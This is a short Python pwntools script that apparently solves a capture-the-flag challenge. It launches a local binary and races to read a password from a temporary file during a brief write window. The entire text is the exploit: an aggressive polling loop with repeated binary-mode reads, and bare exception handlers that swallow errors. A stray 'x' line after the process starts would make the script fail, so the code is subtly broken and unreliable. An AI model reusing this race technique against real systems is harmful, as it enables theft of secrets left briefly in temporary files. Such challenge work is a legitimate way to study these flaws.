#!/usr/bin/env python3
from pwn import *
import time
import os

def main():

    
    # Start the process
    p = process('./chall')
    x
    # Ultra-aggressive polling loop
    start_time = time.time()
    password = None
    
    while time.time() - start_time < 0.5: # Purpose: Creates a loop that runs for 500ms (longer than the 250ms window) to continuously check for the file.
        try:
            # Direct file check with immediate read attempt
            if os.path.isfile("tmp_file.txt"):
                # Multiple rapid read attempts
                time.sleep(0.05)  # 50ms delay to ensure complete write
                for _ in range(30):
                    try:
                        with open("tmp_file.txt", "rb") as f:   # "rb" (binary mode) is faster than text mode
                            content = f.read().decode('utf-8', errors='ignore').strip()
                            if content:
                                password = content
                                break
                    except:
                        pass
                if password:
                    break
        except:
            pass
    
    if password:
        log.success(f"Password: {password}")
    else:
        log.warning("Failed to capture password")
    
    # p.close()

if __name__ == "__main__":
    main()